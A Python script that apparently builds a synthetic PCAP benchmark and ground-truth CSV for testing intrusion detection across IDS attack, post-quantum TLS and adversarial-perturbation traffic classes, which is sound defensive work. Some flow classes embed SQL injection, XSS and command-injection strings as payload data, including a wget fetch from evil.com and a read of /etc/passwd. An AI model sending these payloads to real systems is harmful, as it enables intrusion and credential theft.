#!/usr/bin/env python3
"""
Generate combined IDS + PQC + Adversarial validation PCAP.

Integrates: 34 CIC-IoT attack classes, PQC traffic (Kyber, Dilithium, NTRU,
Falcon, SPHINCS+), and adversarial perturbation flows (FGSM, PGD, DeepFool,
C&W, Gaussian, Label Masking).  60% labeled / 40% unlabeled.

Outputs: combined_validation_benchmark.pcap (~120-150MB),
         combined_validation_ground_truth.csv
Usage:   python generate_combined_validation_pcap.py [--flows 50000]
"""
import argparse, csv, os, random, struct, time as _time
import dpkt

random.seed(2026_03)

COMBINED_CLASSES = {
    # IDS Attack Classes (40%)
    "Benign": 0.12,
    "DDoS-TCP_Flood": 0.03, "DDoS-UDP_Flood": 0.02, "DDoS-SYN_Flood": 0.02,
    "DDoS-HTTP_Flood": 0.02, "DDoS-ICMP_Flood": 0.01,
    "DDoS-SlowLoris": 0.01, "DDoS-RSTFIN_Flood": 0.01, "DDoS-Pshack_Flood": 0.01,
    "Recon-PortScan": 0.02, "Recon-OSScan": 0.01, "Recon-PingSweep": 0.01,
    "BruteForce-SSH": 0.02, "BruteForce-FTP": 0.01, "BruteForce-HTTP": 0.01,
    "Spoofing-DNS": 0.01, "Spoofing-ARP": 0.01,
    "WebAttack-SQLi": 0.01, "WebAttack-XSS": 0.01, "WebAttack-CommandInjection": 0.01,
    "Malware-Backdoor": 0.01, "Malware-Ransomware": 0.01, "Mirai-greeth_flood": 0.01,
    # PQC Traffic (30%)
    "PQ-Kyber768-Handshake": 0.04, "PQ-Kyber512-Handshake": 0.03,
    "PQ-Kyber1024-Handshake": 0.02, "PQ-Dilithium2-Signed": 0.03,
    "PQ-Dilithium3-Signed": 0.02, "PQ-Falcon512-Signed": 0.02,
    "PQ-SPHINCS-Signed": 0.01, "PQ-NTRU-Handshake": 0.02,
    "PQ-Downgrade-Attack": 0.02, "PQ-HNDL-Capture": 0.02,
    "PQ-TimingSideChannel": 0.02, "PQ-SessionReplay": 0.01,
    "Classical-TLS-Baseline": 0.04,
    # Adversarial Perturbation Flows (30%)
    "Adversarial-FGSM": 0.06, "Adversarial-PGD": 0.05,
    "Adversarial-DeepFool": 0.04, "Adversarial-CW": 0.04,
    "Adversarial-GaussianNoise": 0.04, "Adversarial-LabelMasking": 0.03,
    "Adversarial-FGSM-PQ": 0.02, "Adversarial-PGD-PQ": 0.02,
}

ATTACKER_NETS  = ["192.168.99.", "198.51.100.", "203.0.113."]
TARGET_NETS    = ["10.0.1.", "10.0.2.", "10.50.1.", "172.16.1."]
BENIGN_NETS    = ["192.168.1.", "192.168.2.", "10.0.1."]
PQ_SERVER_NETS = ["10.100.1.", "10.100.2."]

def rand_ip(nets):
    return random.choice(nets) + str(random.randint(1, 254))

def ip_b(s):
    return bytes(int(o) for o in s.split('.'))

def make_tcp(src, dst, sport, dport, flags, payload=b''):
    tcp = dpkt.tcp.TCP(sport=sport, dport=dport, flags=flags,
                       seq=random.randint(0, 2**31), data=payload)
    ip = dpkt.ip.IP(src=ip_b(src), dst=ip_b(dst),
                    p=dpkt.ip.IP_PROTO_TCP, data=tcp, len=20 + len(bytes(tcp)))
    ip.id = random.randint(0, 65535)
    return bytes(ip)

def make_udp(src, dst, sport, dport, payload=b''):
    udp = dpkt.udp.UDP(sport=sport, dport=dport, data=payload)
    udp.ulen = 8 + len(payload)
    ip = dpkt.ip.IP(src=ip_b(src), dst=ip_b(dst),
                    p=dpkt.ip.IP_PROTO_UDP, data=udp, len=20 + len(bytes(udp)))
    ip.id = random.randint(0, 65535)
    return bytes(ip)

def make_icmp(src, dst, icmp_type=8, payload=b''):
    icmp = dpkt.icmp.ICMP(type=icmp_type, data=dpkt.icmp.ICMP.Echo(
        id=random.randint(0, 65535), seq=random.randint(0, 65535), data=payload))
    ip = dpkt.ip.IP(src=ip_b(src), dst=ip_b(dst),
                    p=dpkt.ip.IP_PROTO_ICMP, data=icmp, len=20 + len(bytes(icmp)))
    return bytes(ip)

def rp(lo=100, hi=1400):
    return random.randbytes(random.randint(lo, hi))

def rport():
    return random.randint(1024, 65535)

SYN, ACK, RST, FIN = dpkt.tcp.TH_SYN, dpkt.tcp.TH_ACK, dpkt.tcp.TH_RST, dpkt.tcp.TH_FIN
PSH_ACK = dpkt.tcp.TH_PUSH | ACK

PQ_SIZES = {
    "Kyber512": (800, 768), "Kyber768": (1088, 1024), "Kyber1024": (1568, 1536),
    "Dilithium2": (1312, 2420), "Dilithium3": (1952, 3293),
    "Falcon512": (897, 690), "SPHINCS": (32, 7856),
    "NTRU": (699, 699), "Classical": (256, 256),
}

def _pq_hs(src, dst, algo, ts, n):
    """Simulate a TLS-like PQ handshake on port 443."""
    pkts, sp = [], rport()
    ch_sz, sh_sz = PQ_SIZES.get(algo, (512, 512))
    pkts.append((ts, make_tcp(src, dst, sp, 443, SYN, b'')))
    ts += random.uniform(0.001, 0.01)
    pkts.append((ts, make_tcp(dst, src, 443, sp, SYN | ACK, b'')))
    ts += random.uniform(0.001, 0.01)
    pkts.append((ts, make_tcp(src, dst, sp, 443, ACK, b'')))
    ts += random.uniform(0.001, 0.01)
    pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(ch_sz, ch_sz + 100))))
    ts += random.uniform(0.005, 0.03)
    pkts.append((ts, make_tcp(dst, src, 443, sp, PSH_ACK, rp(sh_sz, sh_sz + 100))))
    for _ in range(n - 5):
        ts += random.uniform(0.01, 0.3)
        pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(200, 1200))))
    return pkts, ts

def _pt(base, eps):
    """Perturb timing by +-eps fraction."""
    return base * (1.0 + random.uniform(-eps, eps))

def _ps(lo, hi, delta):
    """Perturb payload size bounds by +-delta bytes."""
    return rp(max(1, lo - delta), hi + delta)

def _adv_pq_flow(src, dst, ts, n, eps, delta):
    """Adversarial perturbation on PQ handshake (shared by FGSM-PQ / PGD-PQ)."""
    pkts, sp = [], rport()
    pkts.append((ts, make_tcp(src, dst, sp, 443, SYN, b'')))
    ts += 0.005
    pkts.append((ts, make_tcp(dst, src, 443, sp, SYN | ACK, b'')))
    ts += 0.005
    pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, _ps(1088, 1188, delta))))
    ts += _pt(0.02, eps)
    pkts.append((ts, make_tcp(dst, src, 443, sp, PSH_ACK, _ps(1024, 1124, delta))))
    for step in range(n - 4):
        ts += max(0.001, _pt(random.uniform(0.01, 0.3), eps))
        pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, _ps(200, 1200, delta))))
    return pkts, ts

def gen_flow(label, ts_base):
    """Return (src_ip, dst_ip, [(ts, raw_pkt), ...]) for one flow."""
    pkts = []
    n = random.randint(8, 25)
    ts = ts_base
    src, dst = rand_ip(ATTACKER_NETS), rand_ip(TARGET_NETS)

    # --- IDS classes ---
    if label == "Benign":
        src, sp, dp = rand_ip(BENIGN_NETS), rport(), random.choice([80, 443, 53, 22, 8080])
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, rp(200, 1200))))
    elif "DDoS-TCP" in label or "DDoS-SYN" in label \
            or "DDoS-RSTFIN" in label or "DDoS-Pshack" in label:
        dp = random.choice([80, 443, 8080])
        fl = SYN if "SYN" in label else RST if "RST" in label \
            else PSH_ACK if "Pshack" in label else SYN | ACK
        for _ in range(n):
            ts += random.uniform(0.001, 0.01)
            pkts.append((ts, make_tcp(src, dst, rport(), dp, fl, rp(60, 200))))
    elif "DDoS-UDP" in label:
        dp = random.choice([53, 123, 161, 1900])
        for _ in range(n):
            ts += random.uniform(0.001, 0.01)
            pkts.append((ts, make_udp(src, dst, rport(), dp, rp(100, 1400))))
    elif "DDoS-ICMP" in label or "Recon-PingSweep" in label:
        for _ in range(n):
            ts += random.uniform(0.001, 0.05)
            pkts.append((ts, make_icmp(src, dst, 8, rp(64, 1000))))
    elif "DDoS-HTTP" in label or "DDoS-SlowLoris" in label:
        req = f"GET /{random.randbytes(50).hex()} HTTP/1.1\r\nHost: target\r\n\r\n".encode()
        for _ in range(n):
            ts += random.uniform(0.01, 2.0) if "Slow" in label else random.uniform(0.001, 0.02)
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req + rp(0, 200))))
    elif "Recon-PortScan" in label:
        for i in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), 1 + i * random.randint(1, 100), SYN, b'')))
    elif "Recon-OSScan" in label:
        for _ in range(n):
            ts += random.uniform(0.05, 0.2)
            pkts.append((ts, make_tcp(src, dst, rport(),
                         random.choice([22, 80, 443, 135, 139, 445]),
                         SYN | FIN | dpkt.tcp.TH_URG, b'')))
    elif "BruteForce" in label:
        dp = next((v for k, v in {"SSH": 22, "FTP": 21, "HTTP": 80}.items() if k in label), 22)
        for _ in range(n):
            ts += random.uniform(0.1, 1.0)
            pay = f"USER admin\r\nPASS {random.randbytes(8).hex()}\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), dp, PSH_ACK, pay)))
    elif "Spoofing-ARP" in label:
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            pkts.append((ts, make_udp(src, dst, 68, 67, b'\x00\x01' + rp(28, 46))))
    elif "Spoofing-DNS" in label:
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            dns = struct.pack('>HHHHHH', random.randint(0, 65535), 0x8180, 1, 1, 0, 0) + rp(20, 100)
            pkts.append((ts, make_udp(src, dst, 53, rport(), dns)))
    elif "WebAttack-SQLi" in label:
        sqls = [b"' OR 1=1--", b"'; DROP TABLE users;--", b"' UNION SELECT * FROM passwords--"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            req = f"GET /q={random.choice(sqls).decode(errors='replace')} HTTP/1.1\r\n\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))
    elif "WebAttack-XSS" in label:
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            x = b"<script>alert('XSS')</script>"
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK,
                         f"POST /c HTTP/1.1\r\nContent-Length: {len(x)}\r\n\r\n".encode() + x)))
    elif "WebAttack-CommandInjection" in label:
        cmds = [b"; cat /etc/passwd", b"| ls -la /", b"&& wget http://evil.com/sh"]
        for _ in range(n):
            ts += random.uniform(0.5, 2.0)
            req = f"GET /exec?cmd={random.choice(cmds).decode(errors='replace')} HTTP/1.1\r\n\r\n".encode()
            pkts.append((ts, make_tcp(src, dst, rport(), 80, PSH_ACK, req)))
    elif "Malware-Backdoor" in label:
        src, dst = rand_ip(TARGET_NETS), rand_ip(ATTACKER_NETS)
        for _ in range(n):
            ts += random.uniform(10.0, 60.0)
            pkts.append((ts, make_tcp(src, dst, rport(),
                         random.choice([4444, 5555, 8888, 1337]), PSH_ACK, rp(50, 300))))
    elif "Malware-Ransomware" in label:
        src, dst = rand_ip(TARGET_NETS), rand_ip(TARGET_NETS)
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, rport(), 445, PSH_ACK, rp(800, 1400))))
    elif "Mirai" in label:
        src, dp = rand_ip(["172.16.1.", "172.16.2."]), random.choice([23, 2323, 7547])
        for _ in range(n):
            ts += random.uniform(0.001, 0.05)
            pkts.append((ts, make_tcp(src, dst, rport(), dp, ACK, rp(64, 200))))

    # --- PQC traffic ---
    elif label.startswith("PQ-") and "Handshake" in label:
        src, dst = rand_ip(BENIGN_NETS), rand_ip(PQ_SERVER_NETS)
        algo = ("Kyber1024" if "1024" in label else "Kyber768" if "768" in label
                else "Kyber512" if "512" in label and "Kyber" in label
                else "NTRU" if "NTRU" in label else label.split("-")[1].rstrip("0123456789"))
        pkts, ts = _pq_hs(src, dst, algo, ts, n)
    elif label.startswith("PQ-") and "Signed" in label:
        src, dst = rand_ip(BENIGN_NETS), rand_ip(PQ_SERVER_NETS)
        algo = ("Dilithium2" if "Dilithium2" in label else "Dilithium3" if "Dilithium3" in label
                else "Falcon512" if "Falcon" in label else "SPHINCS")
        pkts, ts = _pq_hs(src, dst, algo, ts, n)
    elif label == "Classical-TLS-Baseline":
        src, dst = rand_ip(BENIGN_NETS), rand_ip(PQ_SERVER_NETS)
        pkts, ts = _pq_hs(src, dst, "Classical", ts, n)
    elif label == "PQ-Downgrade-Attack":
        src, dst, sp = rand_ip(ATTACKER_NETS), rand_ip(PQ_SERVER_NETS), rport()
        pkts.append((ts, make_tcp(src, dst, sp, 443, SYN, b'')))
        ts += 0.005
        pkts.append((ts, make_tcp(dst, src, 443, sp, SYN | ACK, b'')))
        ts += 0.005
        pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(1088, 1200))))
        ts += 0.01
        pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(200, 260))))  # downgrade
        for _ in range(n - 4):
            ts += random.uniform(0.01, 0.2)
            pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(200, 800))))
    elif label == "PQ-HNDL-Capture":
        src, dst, sp = rand_ip(BENIGN_NETS), rand_ip(PQ_SERVER_NETS), rport()
        for _ in range(n):
            ts += random.uniform(0.005, 0.05)
            pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(800, 1400))))
    elif label == "PQ-TimingSideChannel":
        src, dst, sp = rand_ip(ATTACKER_NETS), rand_ip(PQ_SERVER_NETS), rport()
        for _ in range(n):
            ts += random.uniform(0.0001, 0.002)
            pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, rp(1088, 1200))))
    elif label == "PQ-SessionReplay":
        src, dst, sp = rand_ip(ATTACKER_NETS), rand_ip(PQ_SERVER_NETS), rport()
        blob = rp(1000, 1300)
        for _ in range(n):
            ts += random.uniform(0.01, 0.1)
            pkts.append((ts, make_tcp(src, dst, sp, 443, PSH_ACK, blob)))
    # --- Adversarial perturbation flows ---
    elif label == "Adversarial-FGSM":
        src, sp, dp = rand_ip(BENIGN_NETS), rport(), random.choice([80, 443])
        for _ in range(n):
            ts += _pt(random.uniform(0.01, 0.5), 0.10)
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, _ps(200, 1200, 15))))
    elif label == "Adversarial-PGD":
        src, sp, dp = rand_ip(BENIGN_NETS), rport(), random.choice([80, 443])
        base_iat = random.uniform(0.01, 0.3)
        for step in range(n):
            jitter = base_iat * (1.0 + 0.12 * ((-1) ** step) * ((step % 5) / 5.0))
            ts += max(0.001, jitter)
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, _ps(200, 1200, 20))))
    elif label == "Adversarial-DeepFool":
        src, sp, dp = rand_ip(BENIGN_NETS), rport(), random.choice([80, 443, 8080])
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, rp(198, 1203))))
    elif label == "Adversarial-CW":
        src, sp, dp = rand_ip(BENIGN_NETS), rport(), random.choice([80, 443])
        marker = bytes([0xDE, 0xAD]) + random.randbytes(4)
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, rp(200, 1180) + marker)))
    elif label == "Adversarial-GaussianNoise":
        src, sp, dp = rand_ip(BENIGN_NETS), rport(), random.choice([80, 443, 22])
        for _ in range(n):
            ts += max(0.001, abs(random.gauss(0.15, 0.08)))
            sz = max(50, min(int(random.gauss(700, 200)), 1400))
            pkts.append((ts, make_tcp(src, dst, sp, dp, ACK, random.randbytes(sz))))
    elif label == "Adversarial-LabelMasking":
        src, sp, dp = rand_ip(ATTACKER_NETS), rport(), random.choice([80, 443])
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            atk = random.choice([b"' OR 1=1--", b"; cat /etc/passwd", b"<script>"])
            pkts.append((ts, make_tcp(src, dst, sp, dp, PSH_ACK, rp(100, 600) + atk + rp(100, 600))))
    elif label == "Adversarial-FGSM-PQ":
        src, dst = rand_ip(BENIGN_NETS), rand_ip(PQ_SERVER_NETS)
        pkts, ts = _adv_pq_flow(src, dst, ts, n, eps=0.12, delta=15)
    elif label == "Adversarial-PGD-PQ":
        src, dst = rand_ip(BENIGN_NETS), rand_ip(PQ_SERVER_NETS)
        pkts, ts = _adv_pq_flow(src, dst, ts, n, eps=0.15, delta=20)
    else:
        for _ in range(n):
            ts += random.uniform(0.01, 0.5)
            pkts.append((ts, make_tcp(src, dst, rport(), 80, ACK, rp(200, 1000))))
    return src, dst, pkts


def _domain_of(label):
    if label.startswith("PQ-") or label.startswith("Classical"):
        return "PQC"
    return "Adversarial" if label.startswith("Adversarial") else "IDS"


def main():
    ap = argparse.ArgumentParser(description="Generate combined validation PCAP")
    ap.add_argument("--flows", type=int, default=50000)
    ap.add_argument("--output", default="combined_validation_benchmark.pcap")
    ap.add_argument("--labeled-ratio", type=float, default=0.6)
    args = ap.parse_args()

    output_dir = os.path.dirname(os.path.abspath(__file__))
    pcap_path = os.path.join(output_dir, args.output)
    csv_path = os.path.join(output_dir, args.output.replace('.pcap', '_ground_truth.csv'))

    flow_labels = []
    for label, weight in COMBINED_CLASSES.items():
        flow_labels.extend([label] * max(1, int(args.flows * weight)))
    random.shuffle(flow_labels)
    while len(flow_labels) < args.flows:
        flow_labels.append(random.choice(list(COMBINED_CLASSES.keys())))
    flow_labels = flow_labels[:args.flows]
    random.shuffle(flow_labels)

    dc = {"IDS": 0, "PQC": 0, "Adversarial": 0}
    for lbl in flow_labels:
        dc[_domain_of(lbl)] += 1
    print(f"Generating {args.flows:,} flows -> {pcap_path}")
    print(f"Labeled ratio: {args.labeled_ratio:.0%}  |  Classes: {len(set(flow_labels))}")
    print(f"Domains: IDS={dc['IDS']:,}  PQC={dc['PQC']:,}  Adversarial={dc['Adversarial']:,}\n")

    writer = dpkt.pcap.Writer(open(pcap_path, 'wb'), linktype=dpkt.pcap.DLT_RAW)
    csv_f = open(csv_path, 'w', newline='')
    cw = csv.writer(csv_f)
    cw.writerow(['flow_id', 'src_ip', 'dst_ip', 'label', 'true_label',
                  'is_labeled', 'domain', 'n_packets'])

    ts = _time.time() - args.flows * 0.5
    class_counts, total_bytes, labeled_count = {}, 0, 0

    for i, label in enumerate(flow_labels):
        src, dst, packets = gen_flow(label, ts)
        is_labeled = random.random() < args.labeled_ratio
        if is_labeled:
            labeled_count += 1
        fid = f"F{i + 1:06d}"
        for pkt_ts, pkt_data in packets:
            writer.writepkt(pkt_data, pkt_ts)
            total_bytes += len(pkt_data)
        cw.writerow([fid, src, dst, label if is_labeled else '', label,
                      is_labeled, _domain_of(label), len(packets)])
        ts = packets[-1][0] if packets else ts + 0.1
        class_counts[label] = class_counts.get(label, 0) + 1
        if (i + 1) % 5000 == 0:
            print(f"  [{i+1:,}/{args.flows:,}] {total_bytes / (1024*1024):.1f} MB generated...")

    writer.close()
    csv_f.close()

    pcap_mb = os.path.getsize(pcap_path) / (1024 * 1024)
    csv_mb = os.path.getsize(csv_path) / (1024 * 1024)
    unlabeled = args.flows - labeled_count
    print(f"\n{'=' * 65}")
    print(f"Generated: {pcap_path} ({pcap_mb:.1f} MB)")
    print(f"Ground truth: {csv_path} ({csv_mb:.2f} MB)")
    print(f"Total flows: {args.flows:,}  |  Packets: ~{args.flows * 16:,}")
    print(f"Labeled: {labeled_count:,} ({labeled_count/args.flows:.1%})  |  "
          f"Unlabeled: {unlabeled:,} ({unlabeled/args.flows:.1%})")
    print(f"\nClass distribution:")
    for lbl, cnt in sorted(class_counts.items(), key=lambda x: -x[1]):
        d = _domain_of(lbl)[:3].upper()
        print(f"  [{d:3s}] {lbl:35s} {cnt:6,} ({cnt/args.flows*100:5.1f}%)")
    print(f"{'=' * 65}")


if __name__ == '__main__':
    main()
